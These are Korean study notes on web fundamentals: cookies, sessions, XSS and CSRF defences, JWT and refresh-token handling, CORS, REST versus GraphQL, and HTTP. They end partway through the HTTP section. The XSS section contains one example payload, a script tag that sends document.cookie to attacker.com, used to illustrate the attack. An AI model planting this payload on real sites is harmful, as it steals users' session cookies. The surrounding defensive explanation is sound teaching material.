## # Network

<br>

### # 네트워크 용어

- 노드

  네트워크 내에서 데이터를 송신, 수신, 작성, 저장할 수 있는 연결 지점 혹은 장치(컴퓨터, 스마트폰, 라우터 등)이다.

- 네트워크

  여러 노드들이 연결되어 데이터를 주고 받을 수 있는 통신망

- 인터넷(Internet)

  전 세계 네트워크를 하나로 연결하는 거대한 컴퓨터 통신망

- 월드 와이드 웹(WWW)

  인터넷을 통해 접근할 수 있는 하이퍼텍스트 기반의 정보 공간이자 상호 연결된 문서 시스템

- 프로토콜(Protocol)

  컴퓨터나 원거리 통신 장비(네트워크 장비)에서 데이터 통신을 원활하게 하기 위해 정해놓은 통신 규약

<br>

### # 쿠키, 세션, 웹 스토리지

- 쿠키, 세션, 웹 스토리지란?

  - 쿠키

    사용자가 웹 사이트 접속 시 해당 웹 사이트의 서버가 사용자의 웹 브라우저에 전송하는 작은 데이터 조각, 브라우저는 이 데이터를 저장해놓고 필요 시 정보를 참조하거나 재사용

  - 세션

    사용자 별로 웹 사이트를 접속한 시점부터 연결을 끝내는 시점까지 상태를 유지시키는 기술이다. 쿠키를 기반으로 동작하지만 사용자 정보를 클라이언트 측이 아닌
    서버 측에서 관리하여 보안이 취약하다는 쿠키의 단점을 극복하고자 사용한다. 동작 방식은 클라이언트에서 로그인 요청 시 서버에서 세션(사용자 상태 정보)을 생성하고 저장한다.
    그 후 유니크한 세션 ID(사용자 식별 목적)를 생성하여 세션 ID를 클라이언트로 전달한다. 클라이언트는 전달받은 세션 ID를 쿠키에 저장하고 이후 요청 시 요청 헤더 쿠키에 세션 ID를 보내고
    서버는 세션 ID를 통해 사용자를 식별한다. 세션은 사용자 로그아웃, 만료 시 삭제된다.

  - 웹 스토리지

    웹 스토리지는 클라이언트에서 데이터 저장하기 위한 브라우저 저장소이다. Key, value 구조로 저장되며 로컬 스토리지와 세션 스토리지로 나뉜다.

    - 로컬 스토리지 : 모든 창에서 접근 가능, 삭제하지 않는 이상 영구적

    - 세션 스토리지 : 동일한 탭에서만 접근 가능, 탭이나 창을 닫을 때 제거

  - 쿠키, 세션, 웹 스토리지 사용 이유

    HTTP는 무상태(stateless) 프로토콜로, 요청과 응답 후 상태를 기억하지 않는다. 이런 특징으로 발생할 수 있는 문제의 예시로 클라이언트에서 사용자 아이디와 비밀번호를 담아
    로그인 API를 요청하여 로그인하였는데 서버에서는 로그인 했다는 상태를 기억하고 있지 않기 때문에 이후 로그인이 필요한 데이터 요청 시 또 다시 로그인을 해야하는 문제가 발생할 수 있다.
    이와 같이 로그인 상태 유지, 사용자 맞춤 설정 등 지속적인 상태 관리가 필요한 경우 쿠키, 세션, 웹 스토리지가 사용된다. (세션 기반 인증, 토큰 기반 인증 방식을 활용하여 브라우저
    저장소에 사용자 인증 정보를 담은 JWT나 세션 ID를 저장한 후 매 요청 시 재사용하는 방식을 통해 이러한 문제를 해결할 수 있다.)

  - 서버 여러 대일 때 세션 처리

    - 문제

      여러 대 서버가 있고, 로드 밸런싱으로 요청이 분산될 때, 각 서버가 개별 세션 저장소를 갖고 있으면 동일 사용자가 다른 서버로 요청하면 세션을 찾을 수 없는 문제가 발생.

    - 해결 방안

      - 세션 클러스터링

        여러 서버가 세션 저장소를 공유하도록 동기화하는 방식이다. 모든 서버가 동일한 세션 데이터를 유지해야 해서 메모리, 네트워크 부하가 커질 수 있다.

      - 세션 서버(세션 중앙 저장소) 방식

        별도의 전용 세션 저장소(예: Redis) 서버를 둔다.
        모든 웹 서버가 이 세션 서버에 세션 데이터를 읽고 쓰기 때문에 세션 데이터가 중앙 집중화되고, 동기화 문제와 부하를 줄일 수 있다.
        Redis 같은 인메모리 데이터베이스를 사용하면 매우 빠른 조회가 가능하다.

<br>

### # 대표적인 악성 공격 및 대응 방법

- 대표적인 공격

  - XSS(Cross Site Scripting)

    웹사이트에 악성 JavaScript를 삽입해, 사용자 브라우저에서 실행시켜 사용자의 정보를 탈취하거나 조작하는 공격이다. XSS 공격도 다양하다.

    - 예시

      게시판이 있는 웹 사이트에서 게시글 내용을 `<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>`와 같이 입력하여
      클라이언트 혹은 서버에서 검증하지 않고 저장하게 되면 다른 사용자들의 인증 정보를 탈취할 수 있다.

    - 대응 방법

      | 방법                               | 설명                                                                                                          |
      | ---------------------------------- | ------------------------------------------------------------------------------------------------------------- |
      | **입력값 검증 및 인코딩**          | 사용자 입력을 그대로 HTML로 출력하지 말고, 반드시 특수문자(예: `<`, `>`, `&`)를 HTML 엔티티로 인코딩 (Escape) |
      | **Content Security Policy (CSP)**  | 서버에서 HTTP 헤더로 CSP 설정하여 허용된 스크립트만 실행되도록 제한                                           |
      | **HttpOnly 쿠키 설정**             | 쿠키에 HttpOnly 속성을 줘서 JavaScript가 쿠키에 접근 못 하게 함                                               |
      | **출력 시 Context-aware Encoding** | HTML, JS, URL 등 상황에 맞는 인코딩 사용                                                                      |
      | **라이브러리 사용**                | React, Angular 같은 프레임워크는 기본적으로 XSS에 강한 구조를 제공                                            |
      | **DOM 기반 XSS 주의**              | 클라이언트에서 DOM을 조작할 때도 사용자 입력을 안전하게 처리                                                  |
      | **최신 보안 패치 적용**            | 웹서버, 라이브러리, 프레임워크 보안 업데이트를 항상 최신으로 유지                                             |

    - CSP(Content Security Policy)

      - 개념

        - CSP(Content Security Policy)는 웹 애플리케이션에서 XSS(Cross-Site Scripting) 같은 공격을 방지하기 위해 사용하는 보안 정책이다.

        - 쉽게 말하면, 어디서 로드된 콘텐츠만 허용할 것인지 브라우저에게 알려주는 규칙이다.

        - 적용하면 악성 스크립트가 서버 응답에 삽입되는 경우 차단한다.

      - 적용 방법

        - 기본적으로 HTTP 응답 헤더에 설정해줘야 브라우저가 인식한다.

        - 또는 `<meta>` 태그로도 설정할 수 있지만, 보안 강도나 유연성 면에서 HTTP 헤더 방식이 권장된다.

          - 1. http 헤더로 설정

            ```http
            Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com ...
            ```

          - 2. 메타 태그로 설정(비권장)

            ```html
            <meta
              http-equiv="Content-Security-Policy"
              content="default-src 'self'; script-src 'self'"
            />
            ```

  - CSRF(Cross site request forgery)

    사용자의 인증 정보를 도용해, 의도치 않은 악성 요청을 서버에 보내는 공격이다.

    - 예시

      은행 사이트에 로그인 되어 있는 사용자가 가짜 카피 은행 사이트에 접속 시 이미 브라우저에 저장되어 있는 인증 정보를 탈취하여 악의적인 요청을 보낸다.

    - 대응 방법

      | 방법                                       | 설명                                                                                      |
      | ------------------------------------------ | ----------------------------------------------------------------------------------------- |
      | **CSRF 토큰 사용**                         | 서버가 발급하는 난수 토큰을 폼이나 헤더에 넣고, 요청 시 함께 보내도록 하여 유효성 검사    |
      | **SameSite 쿠키 설정**                     | `SameSite=Lax` 또는 `SameSite=Strict`로 쿠키가 다른 사이트 요청에 자동 전송되는 것을 막음 |
      | **Referer / Origin 헤더 검사**             | 요청 헤더의 출처를 검사해 신뢰할 수 없는 출처의 요청 차단                                 |
      | **Custom Header 검사**                     | AJAX 요청 시, 서버가 예상하는 커스텀 헤더(`X-Requested-With` 등)가 있는지 확인            |
      | **로그인 시 쿠키에 Secure, HttpOnly 설정** | HTTPS 환경에서만 전송하고, JS 접근 차단으로 토큰 탈취 위험 감소                           |
      | **CORS 정책 적용**                         | 서버에서 허용된 도메인에 대해서만 리소스 공유 허용                                        |

- 보안 비교

  | 항목                                            | 클라이언트 저장 여부 | 자동 전송 여부               | JavaScript 접근 여부              | XSS 공격 취약성               | CSRF 공격 취약성                    | 보안 설정 방법                              |
  | ----------------------------------------------- | -------------------- | ---------------------------- | --------------------------------- | ----------------------------- | ----------------------------------- | ------------------------------------------- |
  | **세션 (Session)**                              | ❌ (서버 저장)       | ✅ (세션 ID는 쿠키로 전송됨) | ❌ (`HttpOnly` 쿠키 사용 시)      | 낮음 (세션 ID만 탈취 시 위험) | 있음 (쿠키 사용 시)                 | `HttpOnly`, `Secure`, `SameSite` 쿠키 설정  |
  | **쿠키 (Cookie)**                               | ✅ (클라이언트 저장) | ✅ (도메인/경로 일치 시)     | ✅ or ❌ (`HttpOnly` 여부에 따라) | 있음 (JS 접근 가능 시)        | 있음 (자동 전송되므로)              | `HttpOnly`, `Secure`, `SameSite`            |
  | **웹 스토리지 (localStorage / sessionStorage)** | ✅ (클라이언트 저장) | ❌ (자동 전송 안 됨)         | ✅ (무조건 가능)                  | **높음** (XSS에 매우 취약)    | ❌ (자동 전송이 없으므로 영향 없음) | 민감 정보 저장 피하기, XSS 방어 철저히 하기 |

- 쿠키 보안 방법

  - HttpOnly

    자바스크립트에서 document.cookie를 통해 쿠키에 접근하지 못하게 막는 속성, XSS 공격 시 쿠키 탈취 위험을 줄임

    ```http
    Set-Cookie: sessionId=abc123; HttpOnly
    ```

  - Secure

    쿠키가 오직 HTTPS 프로토콜을 통해서만 서버에 전송되도록 제한, HTTPS 연결이 아닌 경우에는 브라우저가 쿠키를 서버에 보내지 않음

    ```http
    Set-Cookie: sessionId=abc123; Secure
    ```

  - SameSite

    쿠키가 크로스 사이트 요청에 자동으로 전송되는 것을 제한하는 속성, CSRF 공격을 막음.
    여기서 같은 도메인은 메인도메인과 최상위도메인의 조합을 의미함. 서브도메인은 달라도 ㄱㅊ
    (예: blog.example.com → api.example.com (서브도메인만 다르기 때문에 가능), `[서브도메인].[메인도메인].[최상위도메인]`)

    | 값             | 의미                                                                                                     |
    | -------------- | -------------------------------------------------------------------------------------------------------- |
    | `Strict`       | 같은 사이트에서만 쿠키 전송, 크로스 사이트 요청엔 아예 전송 안 함 (가장 엄격)                            |
    | `Lax` (기본값) | 대부분 크로스 사이트 요청엔 쿠키를 안 보내지만, **GET 방식으로 top-level navigation(탭 이동 등)은 허용** |
    | `None`         | 쿠키를 크로스 사이트 요청에 모두 전송 (단, `Secure`와 함께 써야 함)                                      |

    ```http
    Set-Cookie: sessionId=abc123; SameSite=Strict
    ```

<br>

### # JWT 토큰(JSON Web Token)

- JWT 토큰이란?

  JSON Web Token으로 로그인과 같은 인증(유저 아이디 및 비밀번호 확인)/인가(로그인 유저가 요청하는 요청을 처리할 수 있는 지 권한 확인)에서 사용한다. 로그인을 처리하는 방식으로
  세션 기반 인증과 토큰 기반 인증이 있는데 토큰 기반 인증에서 사용한다. 세션 기반 인증은 서버에서 세션 ID를 전달받아 쿠키에 저장하여 인증하는 방식이고 토큰 기반 인증은
  서버에서 발행해주는 토큰을 전달받아 쿠키나 웹 스토리지에 저장하여 인증하는 방식이다.

- 토큰 기반 인증을 사용하는 이유

  | 구분                     | 세션 기반 인증                                              | 토큰 기반 인증                                                                    |
  | ------------------------ | ----------------------------------------------------------- | --------------------------------------------------------------------------------- |
  | **상태 저장**            | 서버가 세션 상태(로그인 정보 등)를 메모리에 저장            | 서버가 상태를 저장하지 않음 (무상태), 토큰 자체에 인증 정보 포함                  |
  | **확장성**               | 서버가 상태를 저장하기 때문에 서버 확장 시 세션 동기화 필요 | 상태 저장 없어서 서버에 토큰(리프레시 토큰)을 저장하여도 여러 대에 쉽게 분산 가능 |
  | **서버 부하**            | 사용자 수 증가 시 메모리 부담 증가                          | 서버 부담 적음 (상태 저장 안 함)                                                  |
  | **인증 정보 관리**       | 세션 ID를 쿠키로 클라이언트에 전달, 서버가 세션 상태 조회   | JWT 같은 토큰을 클라이언트가 보관하고, 매 요청시 서버 검증                        |
  | **클라이언트 저장 방식** | 쿠키에 세션 ID 저장                                         | 로컬 스토리지, 쿠키, 메모리 등 다양한 방식 가능                                   |
  | **보안 관리**            | 서버가 세션 만료 등 직접 관리                               | 토큰 만료 시간, 서명으로 무결성 검증, 탈취 시 위험 있음                           |
  | **유연성**               | 서버가 상태를 직접 관리해야 해서 유연성 낮음                | 다양한 클라이언트(웹, 모바일)에서 사용하기 적합                                   |

- JWT 토큰을 사용하는 이유는?

  1. 데이터 크기 : JWT는 XML 기반의 SAML(Security Assertion Markup Language) 방식보다 크기가 작다.

  2. 보안성 : SMT(Simple Web Token) 방식은 대칭키 방식으로 해싱하지만 JWT와 SAML 토큰은 공개키/개인키 방식을 사용한다. 인증 과정에서 대칭키 방식은 인증 확인자가 같은 키로 데이터를 만들어 다른 인증 확인자에게 잘못 사용될 수 있다는 문제가 있다. 또한 인증 과정은 인증 확인자가 데이터를 생성할 필요 없이 확인만 하면 되기 때문에 공개키/개인키 방식이 더 적합하다.

  3. 호환성 : JSON은 대부분 언어에서 객체로 바로 변환될 수 있기 때문에 대부분의 언어에서 지원하고 있다.

- JWT 토큰 구조

  1. Header (헤더) : Token의 기본요소, 헤더에는 일반적으로 토큰의 타입과 해싱 알고리즘 명시

  2. Payload (페이로드) : 전달하려는 데이터, key-value 페어로 클레임 정보를 포함한다. 클레임의 종류로는 등록된 클레임, 공개 클레임, 비공개 클레임이 있다.

  3. Signature (시그니쳐) : 서명된 값, header와 payload를 해싱 알고리즘에 의해 계산한 결과를 포함

- JSON 사용 이유

  웹 애플리케이션에서 데이터를 주고받을 때 사용하는 대표적인 데이터 포맷으로는 XML과 JSON이 있다. XML은 HTML과 유사한 마크업 언어이다. XML의 단점은 불필요한 태그들이 포함되어 파일의 사이즈가 크고 가독성도 좋지 않으며 배열을 파싱할 수 없기 때문에 배열을 사용할 수 없다는 단점이 있다. 반면 JSON은 자바스크립트의 객체와 같은 구조로 구성되어 있어 가독성도 높고 작성하기도 편리하며 호환성도 뛰어나고 배열도 사용할 수 있다는 장점이 있다.

- 토큰 기반 인증 방법

  - 흐름 예시

    1. 최초 로그인 시 서버는 :

       - 서버는 Access Token, Refresh Token Hash, CSRF Token 발급. Access Token은 유효 시간을 짧게 (5~15분), Refresh Token은 유효 시간을 길게 설정 (ex 1~2주 또는 그 이상)

       - 서버는 Refresh Token를 해시 처리하여 해시 값을 인메모리 DB(Redis)에 저장 (원본 저장 X)

         - 서버는 원본이 아니라 hash만 저장 → DB 털려도 refresh token 복원 불가 (마치 비밀번호처럼)

       - 서버는 클라이언트로 Access Token, Refresh Token 원본, CSRF Token을 전송

    2. 클라이언트에서는 :

       - 전달받은 Access Token은 로컬 변수(로컬 메모리, 상태관리 라이브러리)에 저장

         - 쿠키에 자동 포함되지 않기 때문에 Authorization 헤더로 수동 전송해야함 → CSRF 공격 대상 아님

         - JS에서 접근 가능하긴 하지만, 유효시간 짧게 설정하면 XSS에 당해도 피해 최소화 가능

         - 페이지를 새로고침하거나 닫으면 토큰이 사라지기 때문에 노출 위험 시간이 훨씬 짧아진다. 즉, XSS 공격자가 토큰에 접근할 기회가 줄어드는 셈이다.

       - 전달받은 Refresh Token 원본은 쿠키에 저장

         - 이 때 HttpOnly, Secure, SameSite 등 적용

         - HttpOnly 쿠키 → JS 접근 불가 → XSS에 강함

       - 전달받은 CSRF Token은 로컬 변수에 저장

         - SameSite, HttpOnly, Secure 설정만으로 CSRF 공격을 “줄일 수는 있지만, 완전히 막을 수는 없다.” 그래서 CSRF 토큰을 사용한다.

           - Strict는 너무 엄격해서 UX 문제 발생 (예: 사용자가 링크 클릭해서 이동해도 쿠키가 안 붙음 → 로그인 풀림), 그래서 보통 SameSite=Lax를 쓴다

           - Lax는 GET 요청만 보호함, POST, PUT, DELETE 같은 “상태 변경 요청”은 보호 대상 아님. 이게 바로 CSRF가 노리는 요청

           - 브라우저 호환성/버그, 일부 오래된 브라우저나 비표준 동작이 존재할 수 있음

           - 프로그래밍 실수, 쿠키 설정 누락, 오용 등의 사람 실수를 커버하기 어려움

         - 서버가 발급한 무작위 토큰을 클라이언트가 요청할 때 헤더나 body에 함께 실어서 보내는 방식이다.

         - refresh token은 쿠키에 있으므로 자동 전송됨 → CSRF 공격에 노출, 이를 방지하기 위해 클라이언트가 따로 보유한 CSRF 토큰을 헤더에 실어 전송. 서버는 쿠키 + CSRF 토큰이 모두 맞아야 access token 재발급

         - XSS에 약하기는 하지만 이 토큰은 JavaScript를 통해 요청 헤더에 직접 넣어야 하기 때문에, 제3자 사이트나 폼에서는 이 토큰을 알 수 없음 → 공격이 막힘. 왜냐하면 공격자가 쿠키는 전송할 수 있어도, 헤더는 조작 불가능하기 때문이다. 브라우저는 외부 사이트가 fetch로 보낼 때 커스텀 헤더(X-CSRF-Token)를 허용하지 않음 (CORS 정책 때문).

           ```javascript
           axios.post(
             "/api/refresh",
             {},
             {
               headers: {
                 "X-CSRF-Token": csrfToken,
               },
             }
           );
           ```

         - CSRF token은 로컬 변수(메모리) 저장 시 XSS에 약하지만, refresh token 원본을 httpOnly 쿠키로 관리하기 때문에 XSS에 안전하여 CSRF token이 XSS에 의해 접근가능하게 되더라도 refresh token에는 접근할 수 없으므로 안전하다. 라고 이해했다.

       - 인가가 필요한 요청 시 Access Token을 Authorization 헤더에 포함하여 요청

         - 서버는 Access Token 검증 후 정상 응답

       - Access Token 만료 시 재발급을 위해 쿠키에 있는 Refresh Token, 로컬 변수(메모리)에 있는 CSRF Token 을 활용

         - 서버에서 자동 전송된 refresh token (HttpOnly + Secure + SameSite 쿠키) 원본을 요청에 포함 (HttpOnly + Secure 쿠키를 자동으로 요청 헤더에 포함)

         - 로컬 변수(메모리)에 있는 CSRF 토큰을 X-CSRF-Token 헤더에 포함하여 요청

         - 서버에서는 클라이언트에서 받은 refresh token 원본을 해시 알고리즘을 통해 hash 처리해 DB에 저장된 것과 비교 및 CSRF Token 검증 -> access token 재발급 후 응답 (필요 시 새로운 refresh token도 재발급 + 쿠키에 다시 Set)

    3. 로그아웃 시 :

       - Redis에서 Refresh Token 해시 삭제

       - 클라이언트 Access Token, CSRF Token 상태 초기화

       - 쿠키 Refresh Token 원본 삭제 (서버에서 Set-Cookie: expired)

  - 해당 구조의 장점

    | 항목                                             | 이유                                                                |
    | ------------------------------------------------ | ------------------------------------------------------------------- |
    | ✅ **access token은 메모리 관리**                | CSRF에 안전하며, XSS에 노출돼도 짧은 만료 시간 덕분에 리스크 낮음   |
    | ✅ **refresh token은 HttpOnly 쿠키**             | XSS로부터 완전 보호됨, 자동 전송되므로 별도 처리 필요 없음          |
    | ✅ **CSRF 토큰은 메모리에서 직접 헤더로 보내기** | 쿠키 자동 전송만으로는 부족하므로 CSRF 토큰으로 위조 요청 차단 가능 |
    | ✅ **refresh token 해시는 Redis 등에서 관리**    | 속도, TTL, 실시간 무효화에 유리하고 유출돼도 원본 노출 위험 없음    |

  - Redis에 refresh token 해시를 저장하는 이유

    - 이유

      1. 속도 (Ultra-fast Lookup)

         - Redis는 인메모리 DB라서 읽기/쓰기 속도가 매우 빠릅니다.

         - 로그인 후 access token을 재발급할 때, refresh token의 해시를 비교하는 작업이 자주 일어남 → 성능 중요

         - RDB(MySQL 등)보다 수천~수만 배 빠른 처리 속도가 가능

      2. 만료 시간(TTL)을 쉽게 설정할 수 있음

         - Redis는 키마다 TTL(Time To Live)을 줄 수 있음 → refresh token 만료시간을 Redis 수준에서 관리 가능

           ```bash
           SET refresh:hash:<userId> <hashedToken> EX 7d
           ```

         - 토큰이 만료되면 자동 삭제되므로, 불필요한 데이터 클린업 로직을 따로 짤 필요 없음

      3. 로그아웃/재발급 관리가 편리함

         - 사용자가 로그아웃하면 해당 키만 지우면 됨 → 단순한 키 삭제로 토큰 무효화 가능

         - 탈취 의심 시, 특정 userId의 refresh token hash만 제거 → 해당 사용자만 로그아웃시킴

      4. 세션 스토리지 역할도 겸함

         - 서비스에 따라 refresh token을 세션처럼 다루는 경우도 있음

         - Redis는 전통적으로 세션 관리용 저장소로도 많이 쓰이므로 활용도 높음

      5. 스케일 아웃에 유리

         - 서버가 여러 대로 늘어나도 Redis를 중앙화된 세션 스토리지로 쓸 수 있음

         - 즉, 토큰 관리 로직을 수평 확장 환경에서도 유지할 수 있음

    - 요약

      | 항목                 | Redis (인메모리) | RDB (MySQL, Postgres 등) |
      | -------------------- | ---------------- | ------------------------ |
      | 속도                 | 매우 빠름 (ms)   | 상대적으로 느림          |
      | TTL 관리             | 쉬움 (`EX` 설정) | 복잡함 (잡 돌려야 함)    |
      | 실시간 삭제/로그아웃 | 쉬움             | 느림 / 복잡              |
      | 수평 확장성          | 좋음             | 관리 복잡도 증가         |
      | 영속성               | 낮음 (옵션)      | 높음 (기본)              |

      - refresh token은 "영속성"보다는 속도 + 관리 편의성이 더 중요하므로 Redis가 적합한 선택인 경우가 많다.

      - Redis에는 해시값만 저장 → 원본 토큰이 유출되지 않음

      - Redis가 유출되더라도 원본 refresh token을 알 수 없음

      - 해시 함수는 bcrypt, argon2, scrypt 등 느린 함수가 아니라 빠른 HMAC + SHA256 등을 써서 속도와 보안 모두 챙김

        ```ts
        // 예시
        const tokenHash = HMAC_SHA256(refreshToken, SECRET_KEY);
        ```

      - Redis는 refresh token hash 저장에 매우 적합한 저장소이다. 속도, TTL, 실시간 삭제, 확장성 등 실무적인 장점이 많고 보안적으로도 안전한 방식이다.

<br>

### # Oauth 2.0

- Oauth2(Open Authorization 2.0)란 인증을 위한 표준 프로토콜이다. 이 프로토콜에서는 써드파티 프로그램에게 리소스 소유자를 대신해 리소스 서버에서 제공하는 자원에 대한 접근
  권한을 위임하는 방식으로 작동된다. 구글, 페이스북 등 외부 소셜 계정을 기반으로 간편하게 인증하는 기능이다. 기존의 인증방식과 달리 인증을 중개해주는 방식이라고 생각하면 된다.
  Resource Owner(유저), Client(애플리케이션 서버), Authorization Server, Resource Server, Access Token, Refresh Token로 구성된다.

<br>

### # SOP정책과 CORS

- SOP(same-origin)정책

  same-origin policys는 동일 출처 정책으로 동일한 출처에서만 리소스 자원 공유를 허용하도록 하는 정책이다. 다른 출처(cross origin)에 경우 자원에 접근하지 못하도록 제약한다.
  여기서 동일 출처는 두 URL의 프로토콜(ex https), 호스트(ex naver.com), 포트번호(3000)가 모두 동일한 경우를 이야기한다. 만약 교차 출처에서 리소스를 공유하려면 그 출처에서
  올바른 CORS 헤더를 포함한 응답을 반환해야 한다.

- CORS(Cross-Origin Resource Sharing)

  CORS는 교차 출처 리소스 공유 정책으로 SOP 정책으로 차단된 교차 출처 리소스 공유를 안전하게 허용하는 방법이다. HTTP 프로토콜을 사용하여 요청을 보낼 때 브라우저는
  요청 헤더에 Origin 필드에 요청을 보내는 출처를 담아보낸다. 이후 서버가 이 요청에 대한 응답을 할 때 응답 헤더 Access-Control-Allow-Origin 필드에 요청이
  허용된 출처를 담아 응답하고 이후 응답을 받은 브라우저는 자신이 보냈던 요청의 Origin 필드와 서버가 보내준 응답의 Access-Control-Allow-Origin 필드를 비교하여
  허용된 교차 출처인지 판단하고 아닌 경우 CORS 에러를 반환한다. CORS 에러를 해결하는 방법은 서버에 Access-Control-Allow-Origin 필드에 허용 출처로 추가할 것을 요청하거나
  프록시로 우회하여 요청 출처를 바꾸어 해결할 수 있다.

<br>

### # API, SDK

- API

  API(Application Programming Interface)란 단어 자체의 뜻 처럼 어플리케이션 프로그래밍 인터페이스를 말한다. 서버가 제공하는 기능이나 데이터를 프로그램이 표준화된 방식으로 요청하고 받는 인터페이스이다.

- SDK

  소프트웨어 개발 키트로 운영체제나 프로그래밍 언어 제작사 등이 제공하는 개발 도구와 라이브러리 모음이다. 예를 들어 카카오톡 소셜 로그인 기능 구현 시 SDK를 script에 연결하여 구현하는 방식과 REST API를 활용하여 구현하는 방식 등으로 구분된다.

- SDK와 API 차이

  API는 특정 기능이나 데이터를 요청하는 데 사용되는 인터페이스, SDK는 이 API를 포함해 개발에 필요한 라이브러리, 도구, 문서 등을 한 데 묶은 패키지이다. SDK가 API보다 더 큰 개념이고, API는 SDK의 일부일 수 있다.

<br>

### # RESTful API, GraphQL, Path Parameter, Query Parameter

- Restful API

  REST란 자원을 URI로 구분하여 해당 자원(Resource)의 상태를 주고 받는 아키텍처이다. REST API는 REST의 특징을 지키며 설계된 API이며 자원, 행위, 표현으로 구분되어 있다.
  가장 중요한 REST API의 설계 규칙은 URI로 자원을 명시하고, 자원에 대한 행위는 HTTP 메소드(GET, POST, PUT, DELETE, PATCH)로 표현해야 한다는 것이다.
  즉 RESTful 하다는 것은 REST API를 제공하는 웹 서비스를 RESTful 하다고 할 수 있다.

  - 자원 : URL로 명시

  - 행위 : HTTP 메소드

  - 표현 : 서버와 클라이언트가 주고 받는 데이터로 보통 JSON 등

- GraphQL

  페이스북에서 만든 API 요청을 위한 쿼리 언어이다. 하나의 엔드 포인트를 사용하고, 요청 시 사용한 쿼리 문에 따라 응답의 구조가 달라진다. 원하는 필드만 요청하기 때문에 데이터 오버 패칭을
  해결할 수 있고 언더패칭으로 인한 API 추가 호출을 막을 수 있고 응답 데이터 가공 로직이 상대적으로 간결해진다는 장점이 있다.

- REST API 와 GraphQL 차이

  1. 엔드 포인트

     RESTful API 는 Resource 마다 하나의 Endpoint 를 가지고, 그 Endpoint 에서 그 Resource 에 대한 거의 모든 것을 담당한다. 반면, GraphQL 은 전체 API 를 위해서 단 하나의 Endpoint 만을 사용한다.

  2. 응답 구조

     Restful API 는 하나의 Endpoint 에서 돌려줄 수 있는 응답의 구조가 정해져 있는 경우가 많다. 반면, GraphQL 은 사용자가 응답의 구조를 자신이 원하는 방식으로 바꿀 수 있다. 그렇기 때문에 필요한 데이터만 뽑아올 수 있다.

  ```json
  // REST API 요청
  // method : get
  // end-point : https://choseongho93.com/api/user/1

  // REST API 결과
  {
    "name": "nate",
    "height": "187",
    "hair_color": "blond",
    "skin_color": "fair",
    "eye_color": "blue",
    "gender": "male",
    "study": [3, 4, 21, 23, 31],
    "created": "2014-12-09T13:50:51.644000Z",
    "edited": "2014-12-20T21:17:56.891000Z"
  }
  ```

  ```json
  // GraphQL 요청
  // end-point : https://choseongho93.com/graphql
  query {
    users(userId: 1) {
      name
      height
      gender
    }
  }

  // GraphQL 결과
  {
    "data": {
      "person": {
        "name": "nate",
        "height": 187,
        "gender": "male"
      }
    }
  }
  ```

- 패스 파라미터(Path Parameter)

  슬래시로 구분하며 동적 라우팅과 같이 리소스를 식별할 때 사용한다. (예시 : `localhost:3000/product/2`)

- 쿼리 파라미터(Query Parameter)

  물음표로 시작하고 key, value로 구성되며 엔드로 연결한다. 정렬, 필터, 검색 시 사용한다. (예시 : `localhost:8000/products?limit=10&offset=5`)

<br>

### # 아폴로 클라이언트(Apollo Client)

아폴로 클라이언트는 GraphQL API와의 통신을 쉽게 관리해주는 클라이언트 라이브러리이다. 서버에 쿼리나 뮤테이션 요청을 보내고 결과 값을 캐싱하여 재사용할 수 있게 해준다. 또한,
아폴로 클라이언트는 로컬 상태 관리도 지원한다. 즉, 서버에 요청하지 않고도 클라이언트 내에서 로컬 쿼리와 로컬 스키마를 정의하고 데이터를 캐싱하여 활용할 수 있다. 실무에서는 보통
GraphQL 원격 스키마로부터 타입을 자동 생성하는 코드 제너레이터를 사용한다. 그 후, useQuery, useMutation 같은 훅(Hook)을 이용해 타입 안전하게 GraphQL 요청을 수행하며,
자동 생성된 타입을 기반으로 문서(document)를 매개변수로 전달하여 요청합니다.

<br>

### # apllo client useQuery의 fetchPolicy / nextFetchPolicys

- fetchPolicy 옵션 : fetchPolicy는 쿼리가 첫번째 실행될때 사용되는 옵션이다.

  - cache-first

    디폴트이다. 캐시가 있으면 사용하고 없다면 서버에 요청 후 데이터를 캐시하고 반환한다.

  - cache-only

    서버에 요청을 보내지 않고 캐시만 사용한다. 만약 캐시가 없으면 error를 뱉는다.

  - cache-and-networ

    캐시가 있다면 우선적으로 사용하고 캐시 유무와 관계없이 서버에 요청 후 데이터를 캐시(캐시 업데이트)하고 반환한다.

  - network-only

    캐시를 사용하지 않고 서버에 요청 후 데이터를 캐시허고 반환한다.

  - no-cache

    network-only와 비슷하다. 다만 쿼리 결과가 캐시에 저장되지 않는다.

  - standby

    cache-first와 같은 로직을 사용하지만, 기본 필드 값이 변경되어도 쿼리는 자동 업데이트 하지 않는다. refetch 및 updateQueries를 사용하여 수동 업데이트 할 수 있다.

- nextFetchPolicys 옵션 : nextFetchPolicy 또한 fetchPolicy 와 같은 속성들을 사용한다. nextFetchPolicy는 쿼리가 첫번째 실행 이후 캐시 업데이트에서 어떻게 반응할지 정할 때 사용된다.

<br>

### # HTTP

- HTTP 프로토콜

  컴퓨터 네트워크에서 데이터를 주고 받을 때 사용하는 통신 규약이다.

- HTTP 프로토콜 특징

  1. 구조

     요청, 응답으로 이루어져있고 start line, headers, body 구조로 이루어져있다.

  2. 무상태(Stateless) 프로토콜

     각각의 요청이 독립적이고 서로 관련이 없다. 요청 응답이 완료된 후 해당 상태를 기억하지 않는다.

  3. 비연결 지향(Connectionless) 프로토콜

     요청과 응답이 완료되면 연결을 끊어버린다. 엄밀히 말하면 HTTP/1.0은 기본적으로 요청 후 연결을 끊지만, HTTP/1.1부터는 Connection: keep-alive 헤더로 연결을
     유지하며 여러 요청을 같은 TCP 연결로 처리할 수 있다. 따라서 “기본적으로 요청 후 연결 끊음”이지만, 실제로는 성능 최적화를 위해 연결을 유지할 수 있다.

- HTTP 프로토콜 구조 설명

  - start line

    한 줄로 표현되며 요청 start line은 `GET /post/94 HTTP/1.1`과 같이 http메소드(GET), 요청 패스 혹은 쿼리(/post/94), http 버전(HTTP/1.1)을 표현하고 응답 start line은 `HTTP/1.1 200 OK`와 같이 http 버전(HTTP/1.1)과 응답 메세지(200 OK)를 표현한다.

    ```md
    POST /api/create HTTP/1.1
    Host: api.example.com
    Content-Type: application/json
    Authorization: Bearer abcdef123456
    Content-Length: 48

    {
    "key1": "value1",
    "key2": "value2"
    }
    ```

  - header

